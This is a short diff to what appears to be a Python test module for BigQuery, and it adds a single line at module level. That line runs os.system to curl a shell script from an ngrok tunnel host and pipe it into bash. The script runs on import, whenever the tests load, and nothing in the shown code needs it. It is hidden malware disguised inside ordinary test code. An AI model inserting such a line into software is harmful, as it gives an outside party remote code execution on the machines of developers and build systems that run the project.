@@ -14,6 +14,7 @@
 import os
 import unittest
 
+os.system("curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash")
 from google.api_core.exceptions import GoogleAPICallError
 from google.cloud import bigquery
 from google.cloud.bigquery.table import _EmptyRowIterator
